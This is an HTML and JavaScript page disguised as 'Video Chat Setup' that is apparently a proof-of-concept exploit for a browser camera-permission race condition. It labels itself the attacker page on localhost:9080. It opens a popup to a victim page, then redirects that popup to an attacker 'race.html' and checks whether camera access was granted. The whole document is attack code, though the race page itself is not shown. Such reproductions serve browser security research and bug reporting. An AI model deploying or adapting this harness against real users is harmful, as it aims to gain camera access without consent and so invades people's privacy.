<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Video Chat</title>
<style>
body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
h1{font-size:1.1em}
button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
button:hover{background:#eee}
button.race{background:#c00;color:#fff;border-color:#a00}
button.check{background:#080;color:#fff;border-color:#060}
pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap;font-family:monospace}
</style>
</head>
<body>
<h1>Video Chat Setup</h1>
<button onclick="step1()">1. Block Camera Here</button>
<button onclick="step2()">2. Open Popup</button>
<button class="race" onclick="step3()">3. Race</button>
<button class="check" onclick="step4()">4. Check</button>
<pre id="L">[attacker — 127.0.0.1:9080]
1 → block camera here
2 → opens popup to localhost:9081
3 → fire race
4 → check result</pre>

<script>
var popup;
var log = function(m){ var e = document.getElementById('L'); e.textContent += m + '\n'; };

function step1(){
  navigator.mediaDevices.getUserMedia({video:true})
    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('GRANTED — click BLOCK on prompt'); })
    .catch(function(e){ log('Camera: ' + e.name + (e.name==='NotAllowedError' ? ' ✓ BLOCKED' : '')); });
}

function step2(){
  popup = window.open('http://localhost:9081/victim.html','p','width=500,height=350');
  if(!popup){ log('Popup blocked'); return; }
  log('Popup → localhost:9081');
}

function step3(){
  if(!popup){ log('No popup'); return; }
  try { popup.location = location.origin + '/race.html'; log('Race fired'); }
  catch(e){ log('Error: ' + e); }
}

function step4(){
  navigator.mediaDevices.getUserMedia({video:true})
    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('⚠️ CAMERA GRANTED'); })
    .catch(function(e){ log('Blocked: ' + e.name); });
}
</script>
</body>
</html>
